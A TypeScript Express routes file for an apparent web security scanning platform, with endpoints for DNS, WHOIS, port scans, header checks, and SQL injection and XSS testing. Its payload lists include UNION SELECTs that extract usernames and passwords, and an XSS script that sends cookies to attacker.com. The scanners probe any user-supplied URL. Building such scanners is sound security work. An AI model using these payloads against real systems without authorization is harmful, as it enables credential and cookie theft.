import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { setupAuth } from "./auth";
import util from "util";
import { z } from "zod";
import { insertScanSchema, insertReportSchema } from "@shared/schema";
import axios from "axios";
import { JSDOM } from "jsdom";
import dns from "dns";
import whois from "whois-json";
import crypto from "crypto";
import { URL } from "url";

// DNS lookup promisify
const dnsLookupAsync = util.promisify(dns.lookup);
const dnsResolveAsync = util.promisify(dns.resolve);

export async function registerRoutes(app: Express): Promise<Server> {
  // Set up authentication routes
  setupAuth(app);

  // Middleware to ensure authentication
  const ensureAuthenticated = (req: any, res: any, next: any) => {
    if (req.isAuthenticated()) {
      return next();
    }
    res.status(401).json({ message: "Unauthorized" });
  };

  // Scans endpoints
  app.post("/api/scans", ensureAuthenticated, async (req, res, next) => {
    try {
      const scanData = insertScanSchema.parse({
        ...req.body,
        userId: req.user!.id,
        status: "in-progress",
      });

      const scan = await storage.createScan(scanData);

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "SCAN_CREATED",
        details: `Scan ${scan.id} created for ${scan.target}`,
      });
      
      res.status(201).json(scan);
    } catch (error) {
      next(error);
    }
  });

  app.get("/api/scans", ensureAuthenticated, async (req, res, next) => {
    try {
      const scans = await storage.getScansByUserId(req.user!.id);
      res.json(scans);
    } catch (error) {
      next(error);
    }
  });

  app.get("/api/scans/:id", ensureAuthenticated, async (req, res, next) => {
    try {
      const scanId = parseInt(req.params.id);
      const scan = await storage.getScan(scanId);
      
      if (!scan) {
        return res.status(404).json({ message: "Scan not found" });
      }
      
      if (scan.userId !== req.user!.id && req.user!.role !== "admin") {
        return res.status(403).json({ message: "Forbidden" });
      }
      
      res.json(scan);
    } catch (error) {
      next(error);
    }
  });

  // Recon tools endpoints
  app.post("/api/tools/dns-lookup", ensureAuthenticated, async (req, res, next) => {
    try {
      const { domain } = req.body;
      if (!domain) {
        return res.status(400).json({ message: "Domain is required" });
      }

      const results = {
        addressInfo: null,
        mxRecords: null,
        nsRecords: null,
        txtRecords: null,
        error: null
      };

      try {
        results.addressInfo = await dnsLookupAsync(domain);
        results.mxRecords = await dnsResolveAsync(domain, 'MX');
        results.nsRecords = await dnsResolveAsync(domain, 'NS');
        results.txtRecords = await dnsResolveAsync(domain, 'TXT');
      } catch (error: any) {
        results.error = error.message;
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target: domain,
        scanType: "reconnaissance",
        status: "completed",
        findings: results
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "DNS_LOOKUP",
        details: `DNS lookup performed for ${domain}`,
      });

      res.json({ results, scanId: scan.id });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/tools/whois", ensureAuthenticated, async (req, res, next) => {
    try {
      const { domain } = req.body;
      if (!domain) {
        return res.status(400).json({ message: "Domain is required" });
      }

      let whoisResults;
      let error = null;

      try {
        whoisResults = await whois(domain);
      } catch (err: any) {
        error = err.message;
        whoisResults = null;
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target: domain,
        scanType: "reconnaissance",
        status: "completed",
        findings: { whoisResults, error }
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "WHOIS_LOOKUP",
        details: `WHOIS lookup performed for ${domain}`,
      });

      res.json({ 
        results: { whoisResults, error },
        scanId: scan.id 
      });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/tools/port-scan", ensureAuthenticated, async (req, res, next) => {
    try {
      const { target, ports } = req.body;
      if (!target) {
        return res.status(400).json({ message: "Target is required" });
      }

      // Default to common ports if not specified
      const portsToScan = ports || [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 5432, 8080];
      const results = { openPorts: [], error: null };

      try {
        // Simple port check using sockets
        for (const port of portsToScan) {
          try {
            // Using native Node.js net sockets for better compatibility with shared hosting
            await new Promise<void>((resolve, reject) => {
              const net = require('net');
              const socket = new net.Socket();
              
              socket.setTimeout(1000); // 1 second timeout
              
              socket.on('connect', () => {
                results.openPorts.push(port);
                socket.destroy();
                resolve();
              });
              
              socket.on('timeout', () => {
                socket.destroy();
                resolve();
              });
              
              socket.on('error', () => {
                socket.destroy();
                resolve();
              });
              
              socket.connect(port, target);
            });
          } catch (error) {
            // Ignore individual port errors
          }
        }
      } catch (error: any) {
        results.error = error.message;
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target,
        scanType: "reconnaissance",
        status: "completed",
        findings: results
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "PORT_SCAN",
        details: `Port scan performed for ${target}`,
      });

      res.json({ results, scanId: scan.id });
    } catch (error) {
      next(error);
    }
  });

  app.post("/api/tools/tech-scan", ensureAuthenticated, async (req, res, next) => {
    try {
      const { url } = req.body;
      if (!url) {
        return res.status(400).json({ message: "URL is required" });
      }

      const results = { technologies: [], headers: {}, error: null };

      try {
        // Get page and headers
        const response = await axios.get(url, {
          headers: {
            'User-Agent': 'SecureTest Platform Scanner/1.0'
          }
        });

        // Store headers
        results.headers = response.headers;

        // Parse HTML to look for common technologies
        const dom = new JSDOM(response.data);
        const document = dom.window.document;

        // Check for common JS libraries
        const scripts = document.querySelectorAll('script');
        scripts.forEach(script => {
          const src = script.getAttribute('src') || '';
          if (src.includes('jquery')) results.technologies.push('jQuery');
          if (src.includes('react')) results.technologies.push('React');
          if (src.includes('angular')) results.technologies.push('Angular');
          if (src.includes('vue')) results.technologies.push('Vue.js');
          if (src.includes('bootstrap')) results.technologies.push('Bootstrap');
        });

        // Check meta tags for common frameworks
        const metaTags = document.querySelectorAll('meta');
        metaTags.forEach(meta => {
          const content = meta.getAttribute('content') || '';
          const name = meta.getAttribute('name') || '';
          if (name === 'generator' && content) {
            results.technologies.push(content);
          }
        });

        // Check for common CSS libraries
        const links = document.querySelectorAll('link');
        links.forEach(link => {
          const href = link.getAttribute('href') || '';
          if (href.includes('bootstrap')) results.technologies.push('Bootstrap CSS');
          if (href.includes('fontawesome')) results.technologies.push('Font Awesome');
          if (href.includes('material')) results.technologies.push('Material Design');
        });

        // Remove duplicates
        results.technologies = [...new Set(results.technologies)];
      } catch (error: any) {
        results.error = error.message;
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target: url,
        scanType: "reconnaissance",
        status: "completed",
        findings: results
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "TECH_SCAN",
        details: `Technology scan performed for ${url}`,
      });

      res.json({ results, scanId: scan.id });
    } catch (error) {
      next(error);
    }
  });

  // Vulnerability scanning endpoint
  app.post("/api/tools/vuln-scan", ensureAuthenticated, async (req, res, next) => {
    try {
      const { url } = req.body;
      if (!url) {
        return res.status(400).json({ message: "URL is required" });
      }

      const results = {
        vulnerabilities: [],
        securityHeaders: {},
        sslInfo: null,
        error: null
      };

      try {
        // Check headers security
        const response = await axios.get(url, {
          headers: {
            'User-Agent': 'SecureTest Platform Scanner/1.0'
          }
        });

        // Check security headers
        const securityHeaders = {
          'Content-Security-Policy': response.headers['content-security-policy'] || null,
          'X-XSS-Protection': response.headers['x-xss-protection'] || null,
          'X-Content-Type-Options': response.headers['x-content-type-options'] || null,
          'X-Frame-Options': response.headers['x-frame-options'] || null,
          'Strict-Transport-Security': response.headers['strict-transport-security'] || null,
          'Referrer-Policy': response.headers['referrer-policy'] || null,
          'Permissions-Policy': response.headers['permissions-policy'] || null
        };

        results.securityHeaders = securityHeaders;

        // Check for missing security headers
        if (!securityHeaders['Content-Security-Policy']) {
          results.vulnerabilities.push({
            severity: 'medium',
            title: 'Missing Content-Security-Policy Header',
            description: 'The Content-Security-Policy header is not set. This could allow various attacks including XSS.'
          });
        }

        if (!securityHeaders['X-XSS-Protection']) {
          results.vulnerabilities.push({
            severity: 'low',
            title: 'Missing X-XSS-Protection Header',
            description: 'The X-XSS-Protection header is not set. This could make the site more vulnerable to XSS attacks.'
          });
        }

        if (!securityHeaders['X-Content-Type-Options']) {
          results.vulnerabilities.push({
            severity: 'low',
            title: 'Missing X-Content-Type-Options Header',
            description: 'The X-Content-Type-Options header is not set. This could allow MIME type sniffing.'
          });
        }

        if (!securityHeaders['X-Frame-Options']) {
          results.vulnerabilities.push({
            severity: 'medium',
            title: 'Missing X-Frame-Options Header',
            description: 'The X-Frame-Options header is not set. This could allow clickjacking attacks.'
          });
        }

        if (url.startsWith('https://') && !securityHeaders['Strict-Transport-Security']) {
          results.vulnerabilities.push({
            severity: 'medium',
            title: 'Missing Strict-Transport-Security Header',
            description: 'The Strict-Transport-Security header is not set. This could allow downgrade attacks.'
          });
        }

        // Check for server information disclosure
        if (response.headers['server']) {
          results.vulnerabilities.push({
            severity: 'low',
            title: 'Server Information Disclosure',
            description: `The server is disclosing its software information: ${response.headers['server']}`
          });
        }

        // Check for SSL/TLS (simplistic approach)
        if (url.startsWith('https://')) {
          results.sslInfo = {
            secure: true,
            protocol: 'TLS'
          };
        } else {
          results.vulnerabilities.push({
            severity: 'high',
            title: 'Not Using HTTPS',
            description: 'The site is not using HTTPS, which means all data is being transmitted in clear text.'
          });
        }

      } catch (error: any) {
        results.error = error.message;
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target: url,
        scanType: "vulnerability",
        status: "completed",
        findings: results
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "VULNERABILITY_SCAN",
        details: `Vulnerability scan performed for ${url}`,
      });

      res.json({ results, scanId: scan.id });
    } catch (error) {
      next(error);
    }
  });

  // Web automation endpoint
  app.post("/api/tools/web-automation", ensureAuthenticated, async (req, res, next) => {
    try {
      const { url, selectors } = req.body;
      if (!url) {
        return res.status(400).json({ message: "URL is required" });
      }

      const results = {
        elements: [],
        forms: [],
        error: null
      };

      try {
        // Fetch and parse the page
        const response = await axios.get(url, {
          headers: {
            'User-Agent': 'SecureTest Platform Scanner/1.0'
          }
        });

        const dom = new JSDOM(response.data);
        const document = dom.window.document;

        // If specific selectors are provided, find those elements
        if (selectors && selectors.length > 0) {
          for (const selector of selectors) {
            try {
              const elements = document.querySelectorAll(selector);
              results.elements.push({
                selector,
                count: elements.length,
                found: elements.length > 0
              });
            } catch (error) {
              results.elements.push({
                selector,
                count: 0,
                found: false,
                error: "Invalid selector"
              });
            }
          }
        }

        // Analyze forms
        const forms = document.querySelectorAll('form');
        forms.forEach((form, idx) => {
          const formData = {
            id: form.id || `form-${idx}`,
            action: form.getAttribute('action') || '',
            method: form.getAttribute('method') || 'GET',
            inputs: [] as Array<any>
          };
          
          const inputs = form.querySelectorAll('input, select, textarea');
          inputs.forEach((input: any) => {
            formData.inputs.push({
              name: input.name || '',
              type: input.type || input.tagName.toLowerCase(),
              id: input.id || '',
              required: input.hasAttribute('required')
            });
          });
          
          results.forms.push(formData);
        });

      } catch (error: any) {
        results.error = error.message;
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target: url,
        scanType: "web-automation",
        status: "completed",
        findings: results
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "WEB_AUTOMATION",
        details: `Web automation scan performed for ${url}`,
      });

      res.json({ results, scanId: scan.id });
    } catch (error) {
      next(error);
    }
  });

  // Reports endpoints
  app.post("/api/reports", ensureAuthenticated, async (req, res, next) => {
    try {
      const reportData = insertReportSchema.parse({
        ...req.body,
        userId: req.user!.id,
      });

      const scan = await storage.getScan(reportData.scanId);
      if (!scan) {
        return res.status(404).json({ message: "Scan not found" });
      }

      if (scan.userId !== req.user!.id && req.user!.role !== "admin") {
        return res.status(403).json({ message: "Forbidden" });
      }

      const report = await storage.createReport(reportData);

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "REPORT_CREATED",
        details: `Report ${report.id} created for scan ${scan.id}`,
      });

      res.status(201).json(report);
    } catch (error) {
      next(error);
    }
  });

  app.get("/api/reports", ensureAuthenticated, async (req, res, next) => {
    try {
      const reports = await storage.getReportsByUserId(req.user!.id);
      res.json(reports);
    } catch (error) {
      next(error);
    }
  });

  app.get("/api/reports/:id", ensureAuthenticated, async (req, res, next) => {
    try {
      const reportId = parseInt(req.params.id);
      const report = await storage.getReportById(reportId);
      
      if (!report) {
        return res.status(404).json({ message: "Report not found" });
      }
      
      if (report.userId !== req.user!.id && req.user!.role !== "admin") {
        return res.status(403).json({ message: "Forbidden" });
      }
      
      res.json(report);
    } catch (error) {
      next(error);
    }
  });

  // Activity logs endpoints
  app.get("/api/activity-logs", ensureAuthenticated, async (req, res, next) => {
    try {
      const logs = await storage.getActivityLogsByUserId(req.user!.id);
      res.json(logs);
    } catch (error) {
      next(error);
    }
  });

  // Create HTTP server
  // SQL Injection Scanner Endpoint
  app.post("/api/tools/sql-injection", ensureAuthenticated, async (req, res, next) => {
    try {
      const { url, paramNames, testLevel, includeAuth, authUsername, authPassword } = req.body;
      if (!url) {
        return res.status(400).json({ message: "URL is required" });
      }

      // Parse the URL to extract parameters
      const parsedUrl = new URL(url);
      const targetParams = new Set<string>();
      
      // Extract params from URL
      for (const [key] of parsedUrl.searchParams) {
        targetParams.add(key);
      }
      
      // Add manually specified params
      if (paramNames) {
        paramNames.split(',').forEach(param => {
          param = param.trim();
          if (param) {
            targetParams.add(param);
          }
        });
      }

      // SQL Injection Test payloads (varying complexity based on test level)
      const payloads: Record<string, string[]> = {
        basic: [
          "' OR '1'='1", 
          "1' OR '1'='1", 
          "1 OR 1=1",
          "' --",
          "1' --",
        ],
        intermediate: [
          "' OR '1'='1' --", 
          "\" OR \"1\"=\"1\" --", 
          "1' OR '1'='1' --",
          "' OR 1=1 --",
          "' OR 'x'='x",
          "' AND 1=0 UNION SELECT 1,2,3 --",
          "')) OR 1=1 --",
        ],
        advanced: [
          "' OR '1'='1' --", 
          "\" OR \"1\"=\"1\" --", 
          "' OR 'x'='x' --",
          "')) OR 1=1 --",
          "' OR 1=1 LIMIT 1 --",
          "1' ORDER BY 1 --",
          "1' ORDER BY 10 --",
          "1' UNION SELECT null --",
          "1' UNION SELECT null,null --",
          "' AND 1=0 UNION SELECT 1,2,concat(username,':',password) FROM users --",
          "' AND 1=0 UNION SELECT 1,2,table_name FROM information_schema.tables --",
        ]
      };

      const results = {
        vulnerabilities: [],
        testedUrls: [],
        testedParams: [...targetParams],
        error: null
      };

      if (targetParams.size === 0) {
        results.error = "No parameters found to test for SQL injection";
      } else {
        try {
          for (const param of targetParams) {
            // Test each parameter with test payloads
            for (const payload of payloads[testLevel]) {
              const testUrl = new URL(url);
              
              // Save the original parameter value
              const originalValue = testUrl.searchParams.get(param);
              
              // Set the test payload
              testUrl.searchParams.set(param, payload);
              const testUrlString = testUrl.toString();
              
              // Add to tested URLs
              results.testedUrls.push(testUrlString);
              
              try {
                // Make the request
                const reqOptions: any = {
                  headers: {
                    'User-Agent': 'SecureTest Platform Scanner/1.0'
                  }
                };
                
                // Add authentication if specified
                if (includeAuth && authUsername && authPassword) {
                  reqOptions.auth = {
                    username: authUsername,
                    password: authPassword
                  };
                }
                
                const response = await axios.get(testUrlString, reqOptions);
                
                // Check for typical SQL error patterns in the response
                const responseText = response.data.toString();
                const errorPatterns = [
                  "SQL syntax",
                  "mysql_fetch",
                  "You have an error in your SQL syntax",
                  "ORA-",
                  "Oracle Error",
                  "Microsoft OLE DB Provider for SQL Server",
                  "ODBC Driver",
                  "Unclosed quotation mark after the character string",
                  "PostgreSQL",
                  "supplied argument is not a valid PostgreSQL result",
                  "pg_query() [function.pg-query]"
                ];
                
                for (const pattern of errorPatterns) {
                  if (responseText.includes(pattern)) {
                    const vuln = {
                      parameter: param,
                      severity: "high",
                      details: `SQL error detected in response after injecting payload into parameter '${param}'`,
                      url: testUrlString,
                      payload: payload,
                      pattern: pattern
                    };
                    
                    // Add to vulnerabilities if not already present
                    const exists = (results.vulnerabilities as any[]).some(
                      v => v.parameter === vuln.parameter && v.payload === vuln.payload
                    );
                    
                    if (!exists) {
                      (results.vulnerabilities as any[]).push(vuln);
                    }
                    
                    break;
                  }
                }
                
                // Check for suspicious patterns that might indicate success
                // For example, if a login form is bypassed
                if (responseText.includes("Welcome") || 
                    responseText.includes("Dashboard") || 
                    responseText.includes("Logged in")) {
                  
                  // Make a control request to see if this is normal behavior
                  const controlUrl = new URL(url);
                  controlUrl.searchParams.set(param, "invalid_value_that_should_fail");
                  
                  try {
                    const controlResponse = await axios.get(controlUrl.toString(), reqOptions);
                    const controlText = controlResponse.data.toString();
                    
                    // If control doesn't have these strings but the test does, it might be an injection
                    if (!controlText.includes("Welcome") && 
                        !controlText.includes("Dashboard") && 
                        !controlText.includes("Logged in")) {
                      
                      const vuln = {
                        parameter: param,
                        severity: "high",
                        details: `Possible SQL injection success detected. The payload may have bypassed authentication or authorization.`,
                        url: testUrlString,
                        payload: payload
                      };
                      
                      const exists = (results.vulnerabilities as any[]).some(
                        v => v.parameter === vuln.parameter && v.payload === vuln.payload
                      );
                      
                      if (!exists) {
                        (results.vulnerabilities as any[]).push(vuln);
                      }
                    }
                  } catch (error) {
                    // Ignore control request errors
                  }
                }
              } catch (error) {
                // Ignore individual test errors
              }
            }
          }
        } catch (error: any) {
          results.error = error.message;
        }
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target: url,
        scanType: "vulnerability",
        status: "completed",
        findings: results
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "SQL_INJECTION_SCAN",
        details: `SQL injection scan performed for ${url}`,
      });

      res.json({ results, scanId: scan.id });
    } catch (error) {
      next(error);
    }
  });

  // XSS Scanner Endpoint
  app.post("/api/tools/xss-scan", ensureAuthenticated, async (req, res, next) => {
    try {
      const { url, customPayloads, scanType, scanDepth } = req.body;
      if (!url) {
        return res.status(400).json({ message: "URL is required" });
      }

      // XSS Test payloads (varying complexity based on scan depth)
      const defaultPayloads: Record<string, string[]> = {
        shallow: [
          "<script>alert('XSS')</script>",
          "<img src='x' onerror='alert(\"XSS\")'>",
          "\"><script>alert('XSS')</script>",
        ],
        normal: [
          "<script>alert('XSS')</script>",
          "<img src='x' onerror='alert(\"XSS\")'>",
          "\"><script>alert('XSS')</script>",
          "<svg onload='alert(\"XSS\")'>",
          "javascript:alert('XSS')",
          "<body onload='alert(\"XSS\")'>",
          "<div style='background-image:url(javascript:alert(\"XSS\"))'>",
        ],
        deep: [
          "<script>alert('XSS')</script>",
          "<img src='x' onerror='alert(\"XSS\")'>",
          "\"><script>alert('XSS')</script>",
          "<svg onload='alert(\"XSS\")'>",
          "javascript:alert('XSS')",
          "<body onload='alert(\"XSS\")'>",
          "<div style='background-image:url(javascript:alert(\"XSS\"))'>",
          "<iframe src='javascript:alert(\"XSS\")'></iframe>",
          "<a href='javascript:alert(\"XSS\")'>Click me</a>",
          "<input type='text' value='\" onfocus=\"alert(\"XSS\")\" autofocus=\"'>",
          "'-prompt(1)-'",
          "1';a=prompt,a(1)//",
          "<img src=x onerror=prompt(document.domain)>",
          "<scr\\x69pt>alert(1)</scr\\x69pt>",
          "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        ]
      };

      // Parse custom payloads if provided
      const payloads = customPayloads 
        ? customPayloads.split('\n').filter(p => p.trim().length > 0)
        : defaultPayloads[scanDepth || 'normal'];

      // Parse the URL to extract parameters
      const parsedUrl = new URL(url);
      const injectionPoints = new Map<string, string>();
      
      // Extract params from URL for testing
      for (const [key, value] of parsedUrl.searchParams) {
        injectionPoints.set(key, value);
      }

      const results = {
        vulnerabilities: [],
        injectionPoints: Array.from(injectionPoints.keys()),
        securityScore: null,
        recommendations: [
          "Implement proper input validation and sanitization",
          "Use Content Security Policy (CSP) headers",
          "Apply the principle of least privilege when executing user input",
          "Consider using a web application firewall (WAF)",
          "Keep frameworks and libraries updated to patch known XSS vulnerabilities"
        ],
        error: null
      };

      if (injectionPoints.size === 0) {
        // If no URL parameters, run reflection tests on page content
        results.injectionPoints = ["page-content"];
      }

      // Flag to determine testing approach based on scanType
      const testReflected = scanType === 'reflected' || scanType === 'comprehensive';
      const testDOM = scanType === 'dom' || scanType === 'comprehensive';
      const testStored = scanType === 'stored' || scanType === 'comprehensive';

      try {
        // Reflected XSS Testing
        if (testReflected) {
          for (const [param, originalValue] of injectionPoints) {
            for (const payload of payloads) {
              const testUrl = new URL(url);
              testUrl.searchParams.set(param, payload);
              const testUrlString = testUrl.toString();
              
              try {
                const response = await axios.get(testUrlString, {
                  headers: {
                    'User-Agent': 'SecureTest Platform Scanner/1.0'
                  }
                });
                
                const responseText = response.data.toString();
                
                // Check if the payload is reflected in the response
                if (responseText.includes(payload)) {
                  // Generate a unique test token to test actual JS execution
                  const testToken = crypto.randomBytes(8).toString('hex');
                  const tokenizedPayload = payload.replace('XSS', testToken);
                  
                  // Try again with tokenized payload
                  testUrl.searchParams.set(param, tokenizedPayload);
                  
                  try {
                    const tokenResponse = await axios.get(testUrl.toString(), {
                      headers: {
                        'User-Agent': 'SecureTest Platform Scanner/1.0'
                      }
                    });
                    
                    const tokenResponseText = tokenResponse.data.toString();
                    
                    if (tokenResponseText.includes(tokenizedPayload)) {
                      const vuln = {
                        type: "Reflected",
                        location: `URL parameter '${param}'`,
                        severity: "high",
                        context: `The parameter value is reflected without proper encoding or filtering`,
                        payload: payload,
                        description: "Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.",
                        remediation: "Implement proper input validation, HTML encoding, and consider Content-Security-Policy headers."
                      };
                      
                      (results.vulnerabilities as any[]).push(vuln);
                      
                      // No need to test more payloads for this parameter
                      break;
                    }
                  } catch (error) {
                    // Ignore token test errors
                  }
                }
              } catch (error) {
                // Ignore individual test errors
              }
            }
          }
        }
        
        // DOM-based XSS Testing
        if (testDOM) {
          try {
            // Get baseline page first
            const response = await axios.get(url, {
              headers: {
                'User-Agent': 'SecureTest Platform Scanner/1.0'
              }
            });
            
            const dom = new JSDOM(response.data, {
              url: url,
              runScripts: "outside-only"
            });
            
            // Check for potentially vulnerable DOM patterns
            const document = dom.window.document;
            
            // Check for dangerous functions in script tags
            const scripts = document.querySelectorAll('script');
            for (const script of scripts) {
              const scriptContent = script.textContent || '';
              
              // Look for common sink functions that might be used without proper sanitization
              const domSinkPatterns = [
                'document.write(',
                'innerHTML',
                'outerHTML',
                'insertAdjacentHTML',
                'location',
                'location.href',
                'location.hash',
                'location.search',
                'eval(',
                'setTimeout(',
                'setInterval(',
                'document.cookie',
                'document.domain',
                'execScript(',
                'jQuery'
              ];
              
              for (const pattern of domSinkPatterns) {
                if (scriptContent.includes(pattern)) {
                  // Check if the pattern is used with location.hash or other user-controllable inputs
                  if (scriptContent.includes('location.hash') || 
                      scriptContent.includes('location.search') || 
                      scriptContent.includes('document.URL')) {
                    
                    const vuln = {
                      type: "DOM-based",
                      location: "JavaScript",
                      severity: "medium",
                      context: `Potential DOM XSS sink '${pattern}' found with user-controllable input source`,
                      payload: null,
                      description: "DOM-based XSS occurs when client-side JavaScript dynamically writes user input to the page. Such vulnerabilities can be exploited even when the vulnerable code is in static HTML pages that don't interact with the server after they have been loaded.",
                      remediation: "Use safe DOM APIs like textContent instead of innerHTML, and sanitize user input before inserting it into the DOM."
                    };
                    
                    (results.vulnerabilities as any[]).push(vuln);
                  }
                }
              }
            }
            
            // Check for URL fragment handling
            if (testDOM) {
              for (const payload of payloads) {
                // Test URL fragment
                const testUrl = new URL(url);
                testUrl.hash = payload;
                
                try {
                  const response = await axios.get(testUrl.toString(), {
                    headers: {
                      'User-Agent': 'SecureTest Platform Scanner/1.0'
                    }
                  });
                  
                  // Analysis would depend on client-side execution which isn't possible in this scanner
                  // Instead, look for patterns suggesting fragment usage
                  const responseText = response.data.toString();
                  
                  if (responseText.includes('location.hash') || 
                      responseText.includes('window.location.hash')) {
                    
                    const vuln = {
                      type: "DOM-based",
                      location: "URL fragment (#)",
                      severity: "medium",
                      context: "The application appears to process URL fragments with JavaScript",
                      payload: payload,
                      description: "URL fragments are processed by client-side code and could be vulnerable to DOM-based XSS if not properly sanitized before being used in document operations.",
                      remediation: "Sanitize URL fragment values before inserting them into the DOM. Consider using DOMPurify or similar libraries."
                    };
                    
                    (results.vulnerabilities as any[]).push(vuln);
                    break;
                  }
                } catch (error) {
                  // Ignore test errors
                }
              }
            }
          } catch (error) {
            // Ignore DOM test errors
          }
        }
        
        // Stored XSS Testing (limited capability - would only check for input forms that might be vulnerable)
        if (testStored) {
          try {
            const response = await axios.get(url, {
              headers: {
                'User-Agent': 'SecureTest Platform Scanner/1.0'
              }
            });
            
            const dom = new JSDOM(response.data);
            const document = dom.window.document;
            
            // Check for forms that might be vulnerable to stored XSS
            const forms = document.querySelectorAll('form');
            forms.forEach((form) => {
              // Check if form has text inputs, textareas or rich text editors
              const textInputs = form.querySelectorAll('input[type="text"], textarea');
              
              if (textInputs.length > 0) {
                const formAction = form.getAttribute('action') || '';
                
                const vuln = {
                  type: "Potentially Stored",
                  location: `Form with action '${formAction || 'unspecified'}'`,
                  severity: "medium",
                  context: "Form with text inputs detected - could be vulnerable to stored XSS if user input isn't properly sanitized before storage and display",
                  payload: null,
                  description: "Stored XSS occurs when an application receives user-supplied data and includes it in later HTTP responses in an unsafe way. Common targets include comment forms, user profiles, and forum posts.",
                  remediation: "Always sanitize user input on the server side before storing it, and encode it when outputting to prevent script execution."
                };
                
                (results.vulnerabilities as any[]).push(vuln);
              }
            });
          } catch (error) {
            // Ignore stored XSS test errors
          }
        }
        
        // Calculate a simple security score based on findings
        if (results.vulnerabilities.length === 0) {
          results.securityScore = "A";
        } else {
          const highCount = (results.vulnerabilities as any[]).filter(v => v.severity === "high").length;
          const mediumCount = (results.vulnerabilities as any[]).filter(v => v.severity === "medium").length;
          
          if (highCount > 0) {
            results.securityScore = "F";
          } else if (mediumCount > 2) {
            results.securityScore = "D";
          } else if (mediumCount > 0) {
            results.securityScore = "C";
          } else {
            results.securityScore = "B";
          }
        }
      } catch (error: any) {
        results.error = error.message;
      }

      // Create a scan record
      const scan = await storage.createScan({
        userId: req.user!.id,
        target: url,
        scanType: "vulnerability",
        status: "completed",
        findings: results
      });

      await storage.createActivityLog({
        userId: req.user!.id,
        action: "XSS_SCAN",
        details: `XSS vulnerability scan performed for ${url}`,
      });

      res.json({ results, scanId: scan.id });
    } catch (error) {
      next(error);
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
